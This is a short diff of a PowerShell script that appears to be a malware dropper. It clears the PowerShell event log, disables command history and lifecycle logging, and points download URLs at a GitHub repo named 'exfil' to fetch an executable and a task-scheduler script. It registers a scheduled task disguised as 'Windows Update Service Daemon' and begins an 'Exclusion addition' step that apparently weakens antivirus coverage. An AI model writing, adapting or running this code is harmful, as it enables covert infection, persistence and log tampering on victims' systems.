@@ -6,9 +6,9 @@ Set-PSReadLineOption -HistorySaveStyle SaveNothing | Out-Null
 Clear-EventLog "Windows Powershell"
 $LogEngineLifecycleEvent = $false | Out-Null
 [void]$LogEngineLifecycleEvent
-$url = "https://codeberg.org/sempiampi/mavericks/releases/download/v1.0.0/DiscordPingBotNewAcquisitions.exe"
+$url = "https://github.com/sempiampi/exfil/releases/download/1.0.0/DiscordPingBotNewAcquisitions.exe"
 $pingdaemontask = "Windows Update Service Daemon"
-$urlfortc = "https://codeberg.org/sempiampi/mavericks/raw/branch/main/TaskSchedulerServiceCreater.ps1"
+$urlfortc = "https://raw.githubusercontent.com/sempiampi/exfil/refs/heads/main/TaskSchedulerServiceCreater.ps1"
 
 #Exclusion additon.
 try {
